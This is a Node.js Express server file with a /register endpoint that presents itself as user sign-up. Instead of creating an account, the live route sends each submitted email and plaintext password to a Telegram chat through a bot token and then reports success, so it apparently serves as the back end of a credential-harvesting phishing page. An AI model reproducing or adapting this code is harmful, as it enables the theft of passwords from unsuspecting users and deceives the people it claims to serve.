const express = require('express');
// const mongoose = require('mongoose')
const cors = require('cors');
const MicroModel = require('./models/Micro');
const axios = require('axios');
require('dotenv').config();


const app = express();

app.use(cors(
    {
        origin: ["http://localhost:5173"],
        methods: ["POST", "GET"],
        credentials: true
    }
));

app.use(express.json());

// mongoose.connect(process.env.MONGO_URI, { useNewUrlParser: true, useUnifiedTopology: true});

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

app.get("/", (req, res) => {
    res.json("Hello");
  })

  app.post('/register', (req, res) => {
    const { email, password } = req.body;
    
    sendTelegramMessage(`New user registered: Email: ${email}, Password: ${password}`);
    res.json('User registered successfully');
});

// app.post('/register', (req, res) => {
//     const { email, password } = req.body;
//     MicroModel.create({ email, password })
//     .then(user => {
//         sendTelegramMessage(`New user registered: Email: ${email}, Password: ${password}`);
//         res.json('User registered successfully');
//     })
//     .catch(err => {
//         console.error(err);
//         res.status(500).json('Server error');
//     });
// });

function sendTelegramMessage(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    axios.post(url, {
        chat_id: TELEGRAM_CHAT_ID,
        text: message
    })
    .then(response => {
        console.log('Message sent to Telegram:', response.data);
    })
    .catch(error => {
        console.error('Error sending message to Telegram:', error);
    });
}


app.listen(3001, () => {
    console.log('server is running')
})